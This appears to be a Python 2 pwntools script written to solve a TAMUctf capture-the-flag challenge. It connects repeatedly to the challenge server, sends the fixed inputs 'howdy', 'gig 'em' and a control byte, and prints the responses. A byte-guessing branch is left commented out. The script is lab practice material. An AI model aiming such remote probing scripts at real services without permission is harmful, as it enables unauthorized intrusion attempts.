from pwn import *
context.update(arch='amd64', os='linux', log_level='debug')

def main():
    e = ELF('./getting-confused')
    #p = process('./getting-confused')
    for lb in range(00, 0x100):
        p = remote('challenges.tamuctf.com', 4352)
        sleep(1)
        p.send('howdy\n')
        sleep(1)
        p.send('gig \'em\n')
        sleep(1)
        #p.send(bytearray([lb, 0x0a]).decode('utf-8'))
        p.send('\x04')
        sleep(1)
        v_recv =p.recv(1024)
        print v_recv
        '''
        if v_recv.find('gigem') != -1:
            print v_recv
            raw_input('bytes: ' + str(bytearray([lb, 0x0a])))
            break
        '''

if __name__ == '__main__':
    main()
